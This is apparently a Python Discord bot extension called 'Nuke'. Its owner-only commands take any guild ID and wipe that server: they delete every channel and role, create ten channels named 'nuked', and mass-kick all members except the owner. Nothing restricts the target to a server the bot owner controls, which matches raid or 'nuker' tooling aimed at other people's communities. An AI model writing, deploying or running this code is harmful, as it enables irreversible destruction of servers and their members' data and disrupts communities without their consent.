from discord.ext import commands  # type: ignore
import discord  # type: ignore

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="destroy", help="Destroy the specified server (irreversible)")
    @commands.is_owner()
    async def destroy(self, ctx, guildid: int):
        guild = self.bot.get_guild(guildid)
        if not guild:
            await ctx.send("Invalid Guild ID.")
            return

        await ctx.send("**Process Initiated. Destroying the server...**")

        for channel in guild.channels:
            try:
                await channel.delete()
            except Exception as e:
                print(f"Failed to delete channel {channel.name}: {e}")

        for role in guild.roles:
            try:
                await role.delete()
            except Exception as e:
                print(f"Failed to delete role {role.name}: {e}")

        for _ in range(10):
            try:
                await guild.create_text_channel(name="nuked")
            except Exception as e:
                print(f"Failed to create channel: {e}")

        await ctx.send("Server destruction completed.")

    @commands.command(name="kickall", help="Kick all members from the specified server")
    @commands.is_owner()
    async def kickall(self, ctx, guildid: int):
        guild = self.bot.get_guild(guildid)
        if not guild:
            await ctx.send("Invalid Guild ID.")
            return

        if not guild.me.guild_permissions.kick_members:
            await ctx.send("I don't have permission to kick members.")
            return

        for member in guild.members:
            if member != guild.owner:
                try:
                    await member.kick(reason="Mass kick")
                except Exception as e:
                    print(f"Failed to kick {member.name}: {e}")

        await ctx.send("All members have been kicked.")

    @commands.command(name="clearserver", help="Delete all channels and roles in the server")
    @commands.is_owner()
    async def clearserver(self, ctx, guildid: int):
        guild = self.bot.get_guild(guildid)
        if not guild:
            await ctx.send("Invalid Guild ID.")
            return

        await ctx.send("**Clearing all channels and roles...**")

        for channel in guild.channels:
            try:
                await channel.delete()
            except Exception as e:
                print(f"Failed to delete channel {channel.name}: {e}")

        for role in guild.roles:
            try:
                await role.delete()
            except Exception as e:
                print(f"Failed to delete role {role.name}: {e}")

        await ctx.send("Server cleared.")

async def setup(bot):
    await bot.add_cog(Nuke(bot))